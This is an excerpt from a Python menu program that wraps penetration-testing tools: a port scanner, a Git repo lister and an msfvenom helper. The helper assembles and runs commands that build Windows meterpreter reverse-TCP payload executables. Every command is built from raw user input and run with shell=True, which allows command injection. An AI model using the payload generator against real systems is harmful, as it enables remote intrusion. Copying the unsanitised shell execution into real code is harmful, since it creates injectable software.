...
def kore_tools_menu():
    ...
    while True:
        ...
        print(f"{Colors.GREEN}[3] KORE MAP - Get Open Ports{Colors.END}")
        print(f"{Colors.GREEN}[4] KORE GIT LIST - List Git Repos{Colors.END}")
...
def kore_git_list():
    clear_screen()
    print_banner()
    print(f"{Colors.MAGENTA}{Colors.BOLD}KORE GIT LIST - LIST GIT REPOS{Colors.END}\n")
    url = input(f"{Colors.YELLOW}Enter Git Username/User Url/Repo Url: {Colors.END}")
    start = input(f"{Colors.YELLOW}Start kore git list: {Colors.END}")
   
    command = f"python3 koregitlist.py -u {url}"
    ...
    if confirm.lower() == 'y':
        print(f"\n{Colors.GREEN}Executing command...{Colors.END}")
        subprocess.run(command, shell=True)
        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
    else:
        print(f"\n{Colors.YELLOW}Command execution cancelled.{Colors.END}")
        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
...
def kore_map():
    clear_screen()
    print_banner()
    print(f"{Colors.MAGENTA}{Colors.BOLD}KORE MAP - GET OPEN PORTS{Colors.END}\n")
    url = input(f"{Colors.YELLOW}Enter URL or IP: {Colors.END}")
    start = input(f"{Colors.YELLOW}Start kore map: {Colors.END}")
   
    command = f"python3 koremap.py {url}"
...
def other_tools_menu():
    ...
    while True:
        ...
        print(f"{Colors.GREEN}[7] MSFVENOM - Create Payloads{Colors.END}")
        print(f"{Colors.RED}[8] BACK TO MAIN MENU{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
...
def msfvenom():
    """MSFVenom - Payload Generator with user-friendly prompts"""
    clear_screen()
    print_banner()
    print(f"{Colors.MAGENTA}{Colors.BOLD}MSFVENOM - PAYLOAD GENERATOR{Colors.END}\n")
    
    payload = input(f"{Colors.YELLOW}Enter payload (e.g., windows/meterpreter/reverse_tcp): {Colors.END}")
    lhost = input(f"{Colors.YELLOW}Enter LHOST (your IP): {Colors.END}")
    lport = input(f"{Colors.YELLOW}Enter LPORT (default 4444): {Colors.END}")
    
    output = input(f"{Colors.YELLOW}Enter output file name (e.g., shellcode.exe): {Colors.END}")
    
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o {output}"
    
    print(f"\n{Colors.CYAN}Command to execute:{Colors.END}")
    print(f"{Colors.GREEN}{command}{Colors.END}")
    
    confirm = input(f"\n{Colors.YELLOW}Execute this command? (y/n): {Colors.END}")
